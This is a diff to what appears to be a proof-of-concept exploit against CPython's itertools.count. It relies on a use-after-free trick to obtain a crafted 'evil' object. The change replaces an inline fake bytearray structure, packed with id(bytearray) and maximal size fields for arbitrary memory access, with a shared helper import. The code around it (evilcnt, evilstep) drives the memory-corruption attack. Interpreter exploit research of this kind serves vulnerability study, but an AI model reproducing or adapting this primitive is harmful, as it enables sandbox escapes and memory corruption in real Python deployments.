@@ -37,6 +37,7 @@ count_nextlong(countobject *lz)
 # trick to pass our deleted object to a receiver function to grab the evil object.
 
 from itertools import count
+from common import evil_bytearray_obj
 
 class evilcnt(bytes):
     lock = False
@@ -77,15 +78,8 @@ class evilstep:
         mem = other
         return 1
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_obj = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj()
 
 SIZE = 0x100
 x = count(evilcnt(SIZE - 0x18), evilstep())
